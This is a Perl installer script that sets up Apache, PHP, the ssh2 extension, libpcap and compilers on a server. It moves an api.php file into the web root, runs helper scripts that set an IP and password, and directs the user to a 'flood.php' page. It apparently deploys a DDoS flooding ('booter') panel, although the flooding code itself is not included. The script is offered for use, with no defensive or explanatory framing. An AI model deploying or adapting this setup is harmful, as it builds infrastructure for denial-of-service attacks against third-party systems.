#!/usr/bin/perl

print "Install packages? [Y/n]\n";
chomp($req=<STDIN>);
if(lc ($req) eq "y" || $req eq ""){
	print "Packages Install...\n";
	sleep(2);	
  system("yum install wget curl git net-tools -y");
	system("yum install httpd mod_ssl -y");
	system("/sbin/chkconfig httpd on");
	system("yum install php-mysql php-devel php-gd php-pecl-memcache php-pspell php-snmp php-xmlrpc php-xml -y");
	system("/usr/sbin/apachectl restart");
	system("yum install make -y");
	system("yum install gcc -y");
        system("yum install perl -y");
	print "\nL'Installation OK !\n";
}

print "SSH2 Install? [Y/n]\n";
chomp($ssh=<STDIN>);
if(lc ($ssh) eq "y" || $ssh eq ""){
	print "SSH2 Installation...\n";
	sleep(2);	
	system("yum install php php-pear libssh2 libssh2-devel -y");
	system("pecl install -f ssh2");
	system("touch /etc/php.d/ssh2.ini");
	system("echo extension=ssh2.so > /etc/php.d/ssh2.ini");
	system("/etc/init.d/httpd restart");
	print "\nVerification...\n";
	system("php -m | grep ssh2");
	print "If you see ssh2, it works!\n";
}

print "Compile scripts? [Y/n]\n";
chomp($scripts=<STDIN>);

if(lc ($scripts) eq "y" || $scripts eq ""){
	print "Compilation ...\n";
	sleep(2);
	system("yum -y install screen libpcap-devel tcl tcl-devel gcc");
	system("mv /root/api.php /var/www/html/");
	system("sh /root/sedip.sh");
        system("sh /root/sedpass.sh");
	print "\nGo to http://YOURVPSIPADDRESS/flood.php\n";	
    print "Your VPS IP Address is: ";
    system("curl -L tool.lu/ip");   
    sleep(2);
    system("rm -rf /root/sedip.sh");
    system("rm -rf /root/sedpass.sh");
    sleep(2);
    print "\nFinished !\n";
}
